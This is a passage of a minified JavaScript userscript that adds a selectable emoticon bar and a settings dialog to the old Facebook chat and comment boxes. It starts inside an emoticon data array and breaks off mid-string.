[[295416357239452]][[295416367239451]][[295416373906117]][[295416377239450]]\n[[295416380572783]][[295416387239449]][[295416393906115]][[295416400572781]][[295416403906114]][[295416407239447]]\n[[295416417239446]][[295416430572778]][[295416437239444]][[295416440572777]][[295416447239443]][[295416453906109]]\n[[295416460572775]][[295416467239441]][[295416480572773]][[295416490572772]][[295416493906105]][[295416500572771]]\n','http://i37.servimg.com/u/f37/17/67/69/78/910.png','\n[[295420693905685]][[295420697239018]][[295420700572351]][[295420707239017]][[295420710572350]][[295420713905683]][[295420727239015]][[295420730572348]]\n[[295420733905681]][[295420737239014]][[295420740572347]][[295420743905680]][[295420747239013]][[295420750572346]][[295420757239012]][[295420763905678]]\n[[295420770572344]][[295420773905677]][[295420777239010]][[295420780572343]][[295420783905676]][[295420797239008]][[295420803905674]][[295420807239007]]\n[[295420810572340]][[295420813905673]][[295420820572339]][[295420827239005]][[295420830572338]][[295420833905671]][[295420837239004]][[295420840572337]]\n[[295420843905670]][[295420847239003]][[295420850572336]][[295420853905669]][[295420857239002]][[295420867239001]][[295420870572334]][[295420873905667]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1010.png','\n[[295420303905724]][[295420307239057]][[295420310572390]][[295420320572389]][[295420323905722]][[295420327239055]][[295420330572388]][[295420337239054]]\n[[295420343905720]][[295420347239053]][[295420350572386]][[295420357239052]][[295420360572385]][[295420363905718]][[295420367239051]][[295420370572384]]\n[[295420373905717]][[295420377239050]][[295420380572383]][[295420383905716]][[295420387239049]][[295420390572382]][[295420393905715]][[295420397239048]]\n[[295420400572381]][[295420403905714]][[295420407239047]][[295420410572380]][[295420413905713]][[295420417239046]][[295420427239045]][[295420430572378]]\n[[295420433905711]][[295420440572377]][[295420447239043]][[295420453905709]][[295420457239042]][[295420463905708]][[295420467239041]][[295420470572374]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1110.png','\n[[295418890572532]][[295418900572531]][[295418903905864]][[295418910572530]][[295418917239196]][[295418920572529]]\n[[295418930572528]][[295418933905861]][[295418943905860]][[295418953905859]][[295418957239192]][[295418963905858]]\n[[295418967239191]][[295418970572524]][[295418973905857]][[295418980572523]][[295418983905856]][[295418987239189]]\n[[295418990572522]][[295418997239188]][[295419000572521]][[295419003905854]][[295419007239187]][[295419010572520]]\n[[295419027239185]][[295419030572518]][[295419033905851]][[295419040572517]][[295419043905850]][[295419050572516]]\n[[295419060572515]][[295419063905848]][[295419067239181]][[295419070572514]][[295419073905847]][[295419077239180]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1210.png','\n[[295418400572581]][[295418407239247]][[295418413905913]][[295418417239246]][[295418427239245]][[295418437239244]]\n[[295418450572576]][[295418457239242]][[295418463905908]][[295418470572574]][[295418477239240]][[295418483905906]]\n[[295418487239239]][[295418490572572]][[295418497239238]][[295418517239236]][[295418523905902]][[295418540572567]]\n[[295418553905899]][[295418560572565]][[295418567239231]][[295418573905897]][[295418577239230]][[295418580572563]]\n[[295418583905896]][[295418587239229]][[295418590572562]][[295418607239227]][[295418620572559]][[295418627239225]]\n[[295418633905891]][[295418637239224]][[295418640572557]][[295418647239223]][[295418660572555]][[295418663905888]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1310.png','\n[[295418007239287]][[295418017239286]][[295418037239284]][[295418060572615]][[295418063905948]][[295418070572614]]\n[[295418077239280]][[295418080572613]][[295418083905946]][[295418087239279]][[295418093905945]][[295418107239277]]\n[[295418123905942]][[295418133905941]][[295418147239273]][[295418150572606]][[295418153905939]][[295418157239272]]\n[[295418170572604]][[295418183905936]][[295418190572602]][[295418197239268]][[295418200572601]][[295418210572600]]\n[[295418217239266]][[295418223905932]][[295418227239265]][[295418233905931]][[295418247239263]][[295418253905929]]\n[[295418260572595]][[295418267239261]][[295418277239260]][[295418283905926]][[295418290572592]][[295418297239258]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1410.png','\n[[295419690572452]][[295419697239118]][[295419700572451]][[295419703905784]][[295419707239117]][[295419717239116]][[295419723905782]][[295419727239115]]\n[[295419733905781]][[295419740572447]][[295419743905780]][[295419747239113]][[295419750572446]][[295419753905779]][[295419760572445]][[295419763905778]]\n[[295419767239111]][[295419770572444]][[295419773905777]][[295419777239110]][[295419847239103]][[295419857239102]][[295419860572435]][[295419863905768]]\n[[295419880572433]][[295419883905766]][[295419890572432]][[295419893905765]][[295419900572431]][[295419907239097]][[295419913905763]][[295419917239096]]\n[[295419923905762]][[295419927239095]][[295419930572428]][[295419933905761]][[295419937239094]][[295419940572427]][[295419943905760]][[295419947239093]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1510.png','\n[[295419200572501]][[295419203905834]][[295419207239167]][[295419223905832]][[295419227239165]][[295419230572498]]\n[[295419233905831]][[295419237239164]][[295419247239163]][[295419253905829]][[295419260572495]][[295419263905828]]\n[[295419273905827]][[295419277239160]][[295419283905826]][[295419287239159]][[295419290572492]][[295419293905825]]\n[[295419297239158]][[295419303905824]][[295419307239157]][[295419317239156]][[295419323905822]][[295419327239155]]\n[[295419330572488]][[295419333905821]][[295419343905820]][[295419347239153]][[295419350572486]][[295419360572485]]\n[[295419373905817]][[295419377239150]][[295419387239149]][[295419390572482]][[295419393905815]][[295419397239148]]\n','http://i37.servimg.com/u/f37/17/67/69/78/111.jpg','\n[[280028612111560]][[280028615444893]][[280028618778226]][[280028622111559]][[280028635444891]]\n[[280028642111557]][[280028645444890]][[280028655444889]][[280028665444888]][[280028675444887]]\n[[280028688778219]][[280028702111551]][[280028705444884]][[280028715444883]][[280028722111549]]\n[[280028735444881]][[280028738778214]][[280028742111547]][[280028752111546]][[280028762111545]]\n[[280028768778211]][[280028775444877]][[280028778778210]][[280028785444876]][[280028788778209]]\n','http://i37.servimg.com/u/f37/17/67/69/78/210.jpg','\n[[280029992111422]][[280029995444755]][[280029998778088]][[280030005444754]][[280030008778087]]\n[[280030018778086]][[280030028778085]][[280030042111417]][[280030058778082]][[280030062111415]]\n[[280030088778079]][[280030102111411]][[280030115444743]][[280030125444742]][[280030135444741]]\n[[280030158778072]][[280030172111404]][[280030178778070]][[280030188778069]][[280030195444735]]\n[[280030198778068]][[280030205444734]][[280030212111400]][[280030225444732]][[280030228778065]]\n','http://i37.servimg.com/u/f37/17/67/69/78/310.jpg','\n[[280032022111219]][[280032032111218]][[280032042111217]][[280032048777883]][[280032055444549]]\n[[280032072111214]][[280032078777880]][[280032088777879]][[280032105444544]][[280032115444543]]\n[[280032122111209]][[280032132111208]][[280032158777872]][[280032162111205]][[280032168777871]]\n[[280032178777870]][[280032182111203]][[280032192111202]][[280032195444535]][[280032202111201]]\n[[280032208777867]][[280032212111200]][[280032218777866]][[280032228777865]][[280032232111198]]\n','http://i37.servimg.com/u/f37/17/67/69/78/410.jpg','\n[[286053708175717]][[286053734842381]][[286053754842379]][[286053774842377]][[286053778175710]]\n[[286053791509042]][[286053798175708]][[286053811509040]][[286053821509039]][[286053831509038]]\n[[286053838175704]][[286053848175703]][[286053854842369]][[286053858175702]][[286053871509034]]\n[[286053878175700]][[286053881509033]][[286053884842366]][[286053901509031]][[286053908175697]]\n[[286053911509030]][[286053914842363]][[286053918175696]][[286053921509029]][[286053931509028]]\n','http://i37.servimg.com/u/f37/17/67/69/78/510.jpg','\n[[286055414842213]][[286055421508879]][[286055424842212]][[286055431508878]][[286055438175544]]\n[[286055444842210]][[286055454842209]][[286055461508875]][[286055488175539]][[286055491508872]]\n[[286055504842204]][[286055508175537]][[286055528175535]][[286055534842201]][[286055538175534]]\n[[286055544842200]][[286055554842199]][[286055571508864]][[286055581508863]][[286055588175529]]\n[[286055591508862]][[286055604842194]][[286055618175526]][[286055634842191]][[286055651508856]]\n','http://i37.servimg.com/u/f37/17/67/69/78/610.jpg','\n[[286055848175503]][[286055851508836]][[286055854842169]][[286055858175502]][[286055871508834]]\n[[286055878175500]][[286055891508832]][[286055908175497]][[286055921508829]][[286055944842160]]\n[[286055954842159]][[286055958175492]][[286055964842158]][[286055968175491]][[286055984842156]]\n[[286055988175489]][[286055991508822]][[286056001508821]][[286056004842154]][[286056008175487]]\n[[286056018175486]][[286056031508818]][[286056048175483]][[286056061508815]][[286056071508814]]\n','http://i37.servimg.com/u/f37/17/67/69/78/710.jpg','\n[[286057441508677]][[286057448175343]][[286057451508676]][[286057454842009]][[286057471508674]]\n[[286057481508673]][[286057484842006]][[286057491508672]][[286057501508671]][[286057508175337]]\n[[286057511508670]][[286057518175336]][[286057534842001]][[286057544842000]][[286057548175333]]\n[[286057558175332]][[286057564841998]][[286057574841997]][[286057584841996]][[286057588175329]]\n[[286057598175328]][[286057601508661]][[286057608175327]][[286057611508660]][[286057621508659]]\n','http://i37.servimg.com/u/f37/17/67/69/78/810.jpg','\n[[286057738175314]][[286057741508647]][[286057774841977]][[286057788175309]][[286057794841975]]\n[[286057804841974]][[286057824841972]][[286057828175305]][[286057844841970]][[286057861508635]]\n[[286057868175301]][[286057878175300]][[286057884841966]][[286057891508632]][[286057894841965]]\n[[286057898175298]][[286057904841964]][[286057911508630]][[286057914841963]][[286057924841962]]\n[[286057931508628]][[286057941508627]][[286057948175293]][[286057954841959]][[286057958175292]]\n','http://i37.servimg.com/u/f37/17/67/69/78/910.jpg','\n[[286058071508614]][[286058074841947]][[286058078175280]][[286058084841946]][[286058088175279]]\n[[286058104841944]][[286058114841943]][[286058118175276]][[286058124841942]][[286058131508608]]\n[[286058144841940]][[286058151508606]][[286058161508605]][[286058168175271]][[286058171508604]]\n[[286058188175269]][[286058198175268]][[286058204841934]][[286058214841933]][[286058241508597]]\n[[286058248175263]][[286058254841929]][[286058258175262]][[286058271508594]][[286058281508593]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1110.jpg','\n[[286059154841839]][[286059171508504]][[286059188175169]]\n[[286059201508501]][[286059204841834]][[286059214841833]]\n[[286059218175166]][[286059224841832]][[286059238175164]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1210.jpg','\n[[286059701508451]][[286059711508450]][[286059714841783]][[286059721508449]]\n[[286059724841782]][[286059738175114]][[286059744841780]][[286059748175113]]\n[[286059754841779]][[286059761508445]][[286059768175111]][[286059781508443]]\n[[286059788175109]][[286059804841774]][[286059808175107]][[286059814841773]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1310.jpg','\n[[286065948174493]][[286065951507826]][[286065968174491]][[286065978174490]]\n[[286065984841156]][[286065991507822]][[286066001507821]][[286066004841154]]\n[[286066024841152]][[286066031507818]][[286066034841151]][[286066044841150]]\n[[286066048174483]][[286066051507816]][[286066058174482]][[286066061507815]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1410.jpg','\n[[286061384841616]][[286061388174949]][[286061394841615]][[286061408174947]]\n[[286061418174946]][[286061434841611]][[286061451508276]][[286061464841608]]\n[[286061478174940]][[286061484841606]][[286061508174937]][[286061528174935]]\n[[286061541508267]][[286061548174933]][[286061564841598]][[286061578174930]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1510.jpg','\n[[286062194841535]][[286062198174868]][[286062201508201]][[286062204841534]]\n[[286062214841533]][[286062221508199]][[286062228174865]][[286062241508197]]\n[[286062248174863]][[286062258174862]][[286062268174861]][[286062274841527]]\n[[286062281508193]][[286062314841523]][[286062331508188]][[286062368174851]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1610.jpg','\n[[286064231507998]][[286064234841331]][[286064241507997]][[286064244841330]]\n[[286064248174663]][[286064251507996]][[286064261507995]][[286064268174661]]\n[[286064274841327]][[286064288174659]][[286064298174658]][[286064311507990]]\n[[286064321507989]][[286064331507988]][[286064348174653]][[286064351507986]]\n','http://i37.servimg.com/u/f37/17/67/69/78/1710.jpg','\n[[286065204841234]][[286065214841233]][[286065221507899]][[286065228174565]]\n[[286065234841231]][[286065241507897]][[286065244841230]][[286065248174563]]\n[[286065251507896]][[286065258174562]][[286065261507895]][[286065274841227]]\n[[286065281507893]][[286065288174559]][[286065298174558]][[286065304841224]]\n'];UpdateCheck();var tipsadd = document.createElement('script');tipsadd.setAttribute('src', Http+"//fbemotbar.googlecode.com/files/wz_tooltip.js");tipsadd.setAttribute('type', "text/javascript");headTag = document.getElementsByTagName('head')[0];bodyTag = document.getElementsByTagName('body')[0];if(bodyTag){bodyTag.appendChild(tipsadd);}if(headTag){styleTag = document.createElement('style');styleTag.type = 'text/css';styleTag.innerHTML ='.emote_img{height: 16px;vertical-align: top;width: 16px;background: url("'+Http+'//fbemotbar.googlecode.com/files/em.png") no-repeat scroll 0% 0% transparent;overflow: hidden;cursor: pointer;}#fbcommentemot_open{cursor:pointer;background-color: rgb(109, 132, 180);width:25px;Height:25px;float:right;background-image: url("http://static.ak.fbcdn.net/rsrc.php/v2/y6/x/pLdjpb6rGHT.png"); background-repeat: no-repeat; background-size: auto auto;background-position: -269px -146px;position: relative; z-index: 1;}#fbcommentemot{cursor:pointer;width:25px;Height:25px;float:right;background-image: url("http://static.ak.fbcdn.net/rsrc.php/v2/y6/x/pLdjpb6rGHT.png"); background-repeat: no-repeat; background-size: auto auto; background-position: -269px -120px; position: relative; z-index: 1;}#dialog-confirm{display:none;}#feedback { font-size: 1.4em; }#selectable .ui-selecting { background: #FECA40; }#selectable .ui-selected { background: #F39814; color: white; }#selectable,#AFSE { list-style-type: none; margin: 0; padding: 0; }#selectable li,#AFSE li { margin: 3px; padding: 1px; float: left; width: 100px; height: 80px; font-size: 4em; text-align: center; }'+css+'.chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }.chat_arrow { background-image: url("'+ ResourcesURL + 'v1/zp/r/SBNTDM0S-7U.png"); background-position: 0 -48px; height: 5px; width: 9px; }';headTag.appendChild(styleTag);}if(dir == "ltr"){ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);';ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;';}else{ArrowStyleUp = 'cursor: pointer; position: absolute; left: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);';ArrowStyleDown = 'cursor: pointer; position: absolute; left: 2px;';}fEmotBarDom = document.createElement('div');fEmotBarDom.setAttribute('class','chat_tab_emot_bar');fEmotsListDom = document.createElement('div');fEmotsListDom.setAttribute('name','EmotsList');fEmotBarDom.appendChild(fEmotsListDom);semoticonsn = 1;var siteEmotions_text = [];var siteEmotions_urls = [];var siteEmotions_ids = [];ADDE = getValue("ADDE",'').split(',');ADDE.sort(sortnum);semoticonsimages = '';$.each(ADDE,function(key,i){if(i!=0){siteEmotions_urls.push(getValue("SEimg_" + i,false));siteEmotions_text.push(getValue("SEmotions_" + i,false));siteEmotions_ids.push(i);}});for(i=0;i<siteEmotions_ids.length;i+=1){if(siteEmotions_text[i] != false && siteEmotions_urls[i] != false){if(getValue("SAE_" + siteEmotions_ids[i] , true) == true){var fEmotsDom = document.createElement('img');fEmotsDom.setAttribute('onmouseover', "Tip('<img width=75 height=75 src=\\'"+siteEmotions_urls[i]+"\\'>');");fEmotsDom.setAttribute('onmouseout', "UnTip();");fEmotsDom.setAttribute('alt',siteEmotions_text[i]);fEmotsDom.setAttribute('src',siteEmotions_urls[i]);fEmotsDom.setAttribute('style','cursor: pointer;width:16px;Height:16px;margin-left:2px;margin-bottom:2px');fEmotsDom.setAttribute('class','emote_custom');fEmotsListDom.appendChild(fEmotsDom);semoticonsimages = semoticonsimages + '<li id="added" eid="'+siteEmotions_ids[i]+'" class="ui-state-default ui-selected"><img src="'+siteEmotions_urls[i]+'" style="margin-top:10%;" width="60" Height="60"/></li>';}else{semoticonsimages = semoticonsimages + '<li id="added" eid="'+siteEmotions_ids[i]+'" class="ui-state-default"><img src="'+siteEmotions_urls[i]+'" style="margin-top:10%;" width="60" Height="60"/></li>';}}}for(i=0;i<H4codeEmotions.length;i+=2){if(getValue("ES_" + emoticonsn , true) == true){var fEmotsDom = document.createElement('img');fEmotsDom.setAttribute('onmouseover', "Tip('<img width=75 height=75 src=\\'"+H4codeEmotions[i]+"\\'>');");fEmotsDom.setAttribute('onmouseout', "UnTip();");fEmotsDom.setAttribute('alt',H4codeEmotions[i+1]);fEmotsDom.setAttribute('src',H4codeEmotions[i]);fEmotsDom.setAttribute('style','width:16px;Height:16px;cursor: pointer;margin-left:2px;margin-bottom:2px');fEmotsDom.setAttribute('class','emote_custom');fEmotsListDom.appendChild(fEmotsDom);emoticonsimages = emoticonsimages + '<li id="main" eid="'+emoticonsn+'" class="ui-state-default ui-selected"><img src="'+H4codeEmotions[i]+'" style="margin-top:10%;" width="60" Height="60"/></li>';}else{emoticonsimages = emoticonsimages + '<li id="main" eid="'+emoticonsn+'" class="ui-state-default"><img src="'+H4codeEmotions[i]+'" style="margin-top:10%;" width="60" Height="60"/></li>';}emoticonsn++;}fArrow = document.createElement('i');fArrow.setAttribute('alt','');fArrow.setAttribute('class','img chat_arrow');fArrow.setAttribute('style',ArrowStyleUp);fEmotBarDom.appendChild(fArrow);var setting_visible = getValue('visible',true);document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);function fInsertedNodeHandler(event){if(event.target.getElementsByClassName && em.scb == true && event.target.getElementsByClassName('UFIAddCommentInput')[0]){if(!$(event.target).find('#fcommentemotbar').length == true){insertcommentemot(event.target);}}else if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0]){fInsertEmotBar(event.target);}}emotsInfo = [':)', ':(', ':p', ':D', ':o', ';)', '8)', '8|', '>:(', ':/', ':\'(', '3:)', 'O:)', ':*', '<3', '^_^', '-_-', 'o.O', '>:O', ':v', ':3', '(Y)'];spemotsInfo = [':|]', 'emote/robot.gif', '(^^^)', 'emote/shark.gif', ':putnam:', 'emote/putnam.gif', '<(")', 'emote/penguin.gif', ':42:', 'emote/42.gif'];function insertcommentemot(dinput){cinput = $(dinput).find('.UFIAddCommentInput').parent();elm=document.createElement('div');$(elm).attr('id','fcommentemotbar');for(i=0;i<emotsInfo.length;i+=1) {var fEmotsDom = document.createElement('img');fEmotsDom.setAttribute('alt',emotsInfo[i]);fEmotsDom.setAttribute('style','cursor: pointer; background-position: -'+ 16*i +'px 0px;');fEmotsDom.setAttribute('src',ImagesURL + 'blank.gif');fEmotsDom.setAttribute('class','emote_img');fEmotsDom.addEventListener('click', commentemotclick , false);elm.appendChild(fEmotsDom);}for(i=0;i<spemotsInfo.length;i+=2) {var fEmotsDom = document.createElement('img');fEmotsDom.setAttribute('alt',spemotsInfo[i]);fEmotsDom.setAttribute('src',ImagesURL + spemotsInfo[i+1]);fEmotsDom.setAttribute('style','cursor: pointer;');fEmotsDom.setAttribute('class','emote_custom');fEmotsDom.addEventListener('click', commentemotclick , false);elm.appendChild(fEmotsDom);}$(cinput).prepend(elm);}function commentemotclick(event){var fcommentInput = event.target.parentNode.parentNode.getElementsByClassName('UFIAddCommentInput')[0];var pos = getCursorPosition(fcommentInput);$(fcommentInput).removeClass('DOMControl_placeholder');var txtbef = '';var txtaft = '';if (fcommentInput.value == $(fcommentInput).attr('placeholder')){fcommentInput.value = '';}if (fcommentInput.value.charAt(pos-1) != ' ' && pos-1 > 0){txtbef = ' ';}if (fcommentInput.value.charAt(pos) != ' '){txtaft = ' ';fcommentInput.value = fcommentInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fcommentInput.value.substring(pos);createSelection(fcommentInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);}}function fInsertEmotBar(fChatWrapper){fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0];fNewEmotBar = fEmotBarDom.cloneNode(true);setVisibility(fNewEmotBar);for(i=0;i<fNewEmotBar.firstChild.childNodes.length;i++){fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);if(fChatToolBox.childNodes){fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);}}}function fEmotClickHandler(event){var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];var pos = getCursorPosition(fChatInput);var txtbef = '';var txtaft = '';if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0){txtbef = ' ';}if (fChatInput.value.charAt(pos) != ' '){txtaft = ' ';fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);}}function fHideShowEmotBar(event){fChatBar = document.getElementsByName('EmotsList');if(fChatBar[0].getAttribute('style') == 'display: none;'){for(i=0;i<fChatBar.length;i++){fChatBar[i].setAttribute('style','display: block;');fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);fixHeightAndScroll(fChatBar[i]);}}else{for(i=0;i<fChatBar.length;i++){fChatBar[i].setAttribute('style','display: none;');fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);fixHeightAndScroll(fChatBar[i]);}}setValue('visible',!setting_visible);setting_visible = !setting_visible;}function setVisibility(DOM){if(setting_visible){DOM.firstChild.setAttribute('style','display: block;');DOM.childNodes[1].setAttribute('style',ArrowStyleUp);}else{DOM.firstChild.setAttribute('style','display: none;');DOM.childNodes[1].setAttribute('style',ArrowStyleDown);}}function updatesetting(sarray,AFSE,settingarray){for(i=0;i < emoticonsn;i+=1){setValue("ES_"+i,false);}$.each(sarray,function (k,val){setValue("ES_" + val,true);});$.each(ADDE,function (k,val){setValue("SAE_" + val,false);});$.each(AFSE,function (k,val){setValue("SAE_" + val,true);});$.each(settingarray,function(k,v){setValue(k,v);});reload();}function fixHeightAndScroll(bar){fChatContainer = bar.parentNode.parentNode.parentNode;var oldheight = parseInt(fChatContainer.children[2].style.height.replace("px",""));var newheight = 285 - (fChatContainer.children[0].clientHeight + fChatContainer.children[1].clientHeight + fChatContainer.children[3].clientHeight + 1);fChatContainer.children[2].style.height = newheight + "px";fChatContainer.children[2].scrollTop += oldheight - newheight;}if(headTag){var css = document.createElement('link');css.setAttribute('href', "http://code.jquery.com/ui/1.9.1/themes/start/jquery-ui.css");css.setAttribute('rel', "stylesheet");headTag.appendChild(css);var css2 = document.createElement('link');css2.setAttribute('rel', "stylesheet");css2.setAttribute('href',Http+'//s-static.ak.fbcdn.net/rsrc.php/v2/yj/r/13Ey4qVeOia.css');headTag.appendChild(css2);}options = '';$.each(em.langs,function(k,v){if(em.selectedLanguage == k){options = options + '<option selected="selected" value="' + k + '" >' + v + '</option>';}else{options = options + '<option value="' + k + '" >' + v + '</option>';}});if(getValue('hidenewicon',false) == true){newiconcheckbox = em.lang.get('sd7') + " : " + em.newicon + "<input id='newiconcheckbox' checked='true' type='checkbox' />";}else{newiconcheckbox = em.lang.get('sd7') + " : " + em.newicon + "<input id='newiconcheckbox' type='checkbox' />";}if(em.scb == true){commentcheckbox = em.lang.get('sd6') + "<input id='commentcheckbox' checked='true' type='checkbox' />";}else{commentcheckbox = em.lang.get('sd6') + "<input id='commentcheckbox' type='checkbox' />";}settingdialog = document.createElement('div');settingdialog.setAttribute('id','dialog-confirm');settingdialog.setAttribute('title', em.lang.get('title'));settingdialog.innerHTML = '<input class="inputsubmit" style="cursor:pointer;" type="submit" id="SelectAll" value="' + em.lang.get('sd3') + '" /><input style="float:right;cursor:pointer;" class="inputsubmit" type="submit" id="UnSelectAll" value="' + em.lang.get('sd4') + '" />'+em.lang.get('sd5') + '<select id="langselect">' + options + '</select>&nbsp;' + commentcheckbox + newiconcheckbox + '<hr><br/><center><ol id="selectable">' + semoticonsimages + emoticonsimages + '</ol></center>';document.body.appendChild(settingdialog);var selected = [];buttons = new Object;buttons[em.lang.get('sd1')] = function(){selected = [];AFSE = [];$(".ui-selected#main", "#selectable").each(function(){var index = $(this).attr('eid');selected.push(index);});$(".ui-selected#added", "#selectable").each(function(){var index = $(this).attr('eid');AFSE.push(index);});settingarray = new Object;settingarray.selectedLanguage = $("select#langselect option:selected").attr('value');if($('#newiconcheckbox').is(':checked')){settingarray.hidenewicon = true;}else{settingarray.hidenewicon = false;}if($('#commentcheckbox').is(':checked')){settingarray.showcommentbar = true;}else{settingarray.showcommentbar = false;}updatesetting(selected,AFSE,settingarray);$(this).dialog("close");};buttons[em.lang.get('sd2')] = function(){$(this).dialog("close");$("#settingimg").slideDown("slow");if ($("#settingimg1").is(":hidden") == false){$("#settingimg1").slideUp("fast", function(){$("#settingimg").css("width","44px");});}};$(document).ready(function(){$("#selectable").selectable();$("#dialog-confirm").dialog({draggable: false,resizable: false,autoOpen: false,height: em.h ,width: em.w,modal: true,stack: true,sticky: true,show: "blind",hide: "explode",buttons: buttons});$(window).resize(function(){$('.ui-dialog').css('width',$(window).width());$('.ui-dialog').css('height',$(window).height());$('.ui-dialog').css('top','0px');$('.ui-dialog').css('left','0px');$('#dialog-confirm').css('height',($(window).height() - 115));});$("#SelectAll").click(function(){$("li", "#dialog-confirm").each(function(){$(this).attr("class","ui-state-default ui-selectee ui-selected");});});$("#UnSelectAll").click(function(){$("li", "#dialog-confirm").each(function(){$(this).attr("class","ui-state-default");});});if(em.scb == true){$(".UFIAddCommentInput").each(function(k,e){if(!$(this).parent().find('#fcommentemotbar').length == true){cinput = $(this).parent();elm=document.createElement('div');$(elm).attr('id','fcommentemotbar');for(i=0;i<emotsInfo.length;i+=1) {var fEmotsDom = document.createElement('img');fEmotsDom.setAttribute('alt',emotsInfo[i]);fEmotsDom.setAttribute('style','cursor: pointer; background-position: -'+ 16*i +'px 0px;');fEmotsDom.setAttribute('src',ImagesURL + 'blank.gif');fEmotsDom.setAttribute('class','emote_img');fEmotsDom.addEventListener('click', commentemotclick , false);elm.appendChild(fEmotsDom);}for(i=0;i<spemotsInfo.length;i+=2) {var fEmotsDom = document.createElement('img');fEmotsDom.setAttribute('alt',spemotsInfo[i]);fEmotsDom.setAttribute('src',ImagesURL + spemotsInfo[i+1]);fEmotsDom.setAttribute('style','cursor: pointer;');fEmotsDom.setAttribute('class','emote_custom');fEmotsDom.addEventListener('click', commentemotclick , false);elm.appendChild(fEmotsDom);}$(cinput).prepend(elm);}});}function jresponse(r){response = $.parseJSON(r.responseText);$('#EmoticonsBar_dialog').find('#load').slideUp('slow');if(response.found == true){rtd = document.createElement('td');acceptaddinput = document.createElement('input');acceptaddinput.setAttribute('id','ADD_Emoticon');acceptaddinput.setAttribute('readonly','true');acceptaddinput.setAttribute('type','image');acceptaddinput.setAttribute('src','http://fbemotbar.googlecode.com/files/add.gif');bbtn = document.createElement('input');bbtn.setAttribute('readonly','true');bbtn.setAttribute('type','image');bbtn.setAttribute('src','http://fbemotbar.googlecode.com/files/bbtn.gif');$(bbtn).click(function(){try{$('#EmoticonsBar_dialog').find('#errormsg').slideUp('slow');$('#EmoticonsBar_dialog').find('#emotidinput').val('');$('#EmoticonsBar_dialog').find('#main').slideDown('slow');$('#EmoticonsBar_dialog').find('.layerConfirm').slideDown('fast');$('#EmoticonsBar_dialog').find('#load').slideUp('slow');$('#EmoticonsBar_dialog').find('#response').slideUp('slow');$('#EmoticonsBar_dialog').slideDown('slow');}catch(e){em.er(e);}});$(acceptaddinput).click(function(){try{setValue("SEmotions_" + response.id, response.text);setValue("SEimg_" + response.id, response.img);ADDE = getValue("ADDE",'0').split(',');if($.inArray(num,ADDE) == -1){ADDE.push(num);setValue("ADDE", ADDE.join(','));}$('#EmoticonsBar_dialog').slideUp('slow');$('#EmoticonsBar_dialog').find('.layerConfirm').slideDown();}catch(e){em.er(e);}});$('#EmoticonsBar_dialog').find('#response').slideDown('slow');$('#EmoticonsBar_dialog').find('#response').html('<img src="'+response.img+'"><br/>');$('#EmoticonsBar_dialog').find('#response').append(bbtn);$('#EmoticonsBar_dialog').find('#response').append(acceptaddinput);}else{$('#EmoticonsBar_dialog').find('.layerConfirm').slideDown();$('#EmoticonsBar_dialog').find('#errormsg').html(em.lang.get('er1'));$('#EmoticonsBar_dialog').find('#errormsg').slideDown('slow');$('#EmoticonsBar_dialog').find('#main').slideDown('slow');}}function UpdateResponse(r){setValue('LastUpdate', new Date().getTime() + '');if (r.responseText.match(/@version\s+(\d+\.\d+)/)[1] > em.version){em.c('up');if(confirm(em.lang.get('cu2') + "\n" + em.lang.get('cu3') + em.version + "\n" + em.lang.get('cu4') + r.responseText.match(/@version\s+(\d+\.\d+)/)[1] + "\n" + em.lang.get('cu5'))){openInTab('http://userscripts.org/scripts/source/136011.user.js');}}else{alert(em.lang.get('cu1'));}}$(".fbNubFlyout.fbDockChatTabFlyout").each(function(k,e){fInsertEmotBar(this);});$('#pinnedNav').find('.uiSideNav').prepend('<li class="sideNavItem closed stat_elem key-uf" id="navItem_app_00000000000"><a onclick="return false;" title="Emoticons Bar" class="item" id="EBMenuTitle"><div class="clearfix"><div class="rfloat"><span>'+em.newimg+'</span></div><div><span class="imgWrap"><img class="img" src="http://fbemotbar.googlecode.com/files/micon.gif" alt=""></span><span class="linkWrap">Emoticons Bars</span></div></div></a><ul id="subitem-uf"><li><a onclick="return false;" id="EBoptionAddE" class="subitem"><div class="clearfix"><div class="rfloat"><span style="display: none;" class="loadingIndicator" id="loadingIndicatorAwaitings"></span></div><div><span class="linkChild" id="EBoptionTextAddE">'+em.lang.get('st1')+'</span></div></div></a></li><li><a onclick="return false;" 